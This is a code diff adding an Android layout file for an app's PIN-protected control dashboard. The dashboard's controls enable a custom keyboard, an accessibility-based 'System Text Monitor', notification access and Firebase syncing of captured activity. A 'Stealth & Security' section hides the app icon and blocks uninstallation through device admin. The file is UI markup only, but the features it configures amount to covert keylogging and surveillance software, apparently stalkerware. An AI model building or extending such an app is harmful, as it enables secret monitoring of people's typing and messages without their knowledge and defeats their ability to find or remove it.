@@ -1,0 +1,270 @@
+<?xml version="1.0" encoding="utf-8"?>
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+
+    <!-- Dashboard Content (Hidden behind black overlay until login) -->
+    <ScrollView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:fillViewport="true"
+        android:background="#F5F5F5">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:padding="20dp">
+
+            <TextView
+                android:id="@+id/txtDashboardTitle"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="My Keyboard Dashboard"
+                android:textSize="26sp"
+                android:textStyle="bold"
+                android:textColor="#333333"
+                android:gravity="center"
+                android:layout_marginTop="16dp"
+                android:layout_marginBottom="8dp" />
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Manage your system-wide monitoring and security below."
+                android:textSize="14sp"
+                android:textColor="#666666"
+                android:gravity="center"
+                android:layout_marginBottom="16dp" />
+
+            <!-- Test Sync Button -->
+            <Button
+                android:id="@+id/btnTestSync"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Test Firebase Sync Now"
+                android:backgroundTint="#388E3C"
+                android:textColor="#FFFFFF"
+                android:layout_marginBottom="16dp" />
+
+            <!-- Live Log Console Card -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="#1E1E1E"
+                android:padding="16dp"
+                android:layout_marginBottom="20dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Live Sync Log Console"
+                    android:textStyle="bold"
+                    android:textSize="16sp"
+                    android:textColor="#FFFFFF"
+                    android:layout_marginBottom="8dp" />
+
+                <ScrollView
+                    android:layout_width="match_parent"
+                    android:layout_height="140dp"
+                    android:fillViewport="true">
+
+                    <TextView
+                        android:id="@+id/txtLogConsole"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Waiting for activity..."
+                        android:textSize="12sp"
+                        android:textColor="#00FF00"
+                        android:fontFamily="monospace" />
+                </ScrollView>
+            </LinearLayout>
+
+            <!-- Card 1: Keyboard -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/key_background"
+                android:padding="16dp"
+                android:layout_marginBottom="16dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="1. Custom Keyboard"
+                    android:textStyle="bold"
+                    android:textSize="16sp"
+                    android:textColor="#000000" />
+
+                <TextView
+                    android:id="@+id/txtKeyboardStatus"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Status: Checking..."
+                    android:textSize="14sp"
+                    android:textColor="#D32F2F"
+                    android:layout_marginTop="4dp"
+                    android:layout_marginBottom="12dp" />
+
+                <Button
+                    android:id="@+id/btnEnableKeyboard"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Configure Keyboard" />
+            </LinearLayout>
+
+            <!-- Card 2: Accessibility -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/key_background"
+                android:padding="16dp"
+                android:layout_marginBottom="16dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="2. System Text Monitor (Accessibility)"
+                    android:textStyle="bold"
+                    android:textSize="16sp"
+                    android:textColor="#000000" />
+
+                <TextView
+                    android:id="@+id/txtAccessibilityStatus"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Status: Checking..."
+                    android:textSize="14sp"
+                    android:textColor="#D32F2F"
+                    android:layout_marginTop="4dp"
+                    android:layout_marginBottom="12dp" />
+
+                <Button
+                    android:id="@+id/btnEnableAccessibility"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Enable Accessibility" />
+            </LinearLayout>
+
+            <!-- Card 3: Notification Access -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/key_background"
+                android:padding="16dp"
+                android:layout_marginBottom="16dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="3. Notification Access"
+                    android:textStyle="bold"
+                    android:textSize="16sp"
+                    android:textColor="#000000" />
+
+                <TextView
+                    android:id="@+id/txtNotificationStatus"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Status: Checking..."
+                    android:textSize="14sp"
+                    android:textColor="#D32F2F"
+                    android:layout_marginTop="4dp"
+                    android:layout_marginBottom="12dp" />
+
+                <Button
+                    android:id="@+id/btnEnableNotification"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Enable Notifications" />
+            </LinearLayout>
+
+            <!-- Card 4: Stealth & Security -->
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/key_background"
+                android:padding="16dp"
+                android:layout_marginBottom="24dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="4. Stealth &amp; Security"
+                    android:textStyle="bold"
+                    android:textSize="16sp"
+                    android:textColor="#000000"
+                    android:layout_marginBottom="8dp" />
+
+                <Button
+                    android:id="@+id/btnHideAppIcon"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Hide App Icon from Drawer"
+                    android:backgroundTint="#0277BD"
+                    android:textColor="#FFFFFF"
+                    android:layout_marginBottom="8dp" />
+
+                <Button
+                    android:id="@+id/btnEnableAdmin"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Enable Uninstall Protection"
+                    android:backgroundTint="#C62828"
+                    android:textColor="#FFFFFF" />
+            </LinearLayout>
+
+        </LinearLayout>
+    </ScrollView>
+
+    <!-- Full Black Login Overlay (Blocks everything until correct PIN) -->
+    <LinearLayout
+        android:id="@+id/loginOverlay"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:background="#000000"
+        android:gravity="center"
+        android:padding="24dp"
+        android:clickable="true"
+        android:focusable="true"
+        android:visibility="visible">
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Protected Access"
+            android:textColor="#FFFFFF"
+            android:textSize="22sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="16dp" />
+
+        <EditText
+            android:id="@+id/etPinInput"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="Enter Password"
+            android:textColorHint="#888888"
+            android:textColor="#FFFFFF"
+            android:inputType="numberPassword"
+            android:gravity="center"
+            android:background="#222222"
+            android:padding="14dp"
+            android:layout_marginBottom="16dp" />
+
+        <Button
+            android:id="@+id/btnLoginSubmit"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Unlock"
+            android:backgroundTint="#388E3C"
+            android:textColor="#FFFFFF" />
+
+    </LinearLayout>
+
+</FrameLayout>
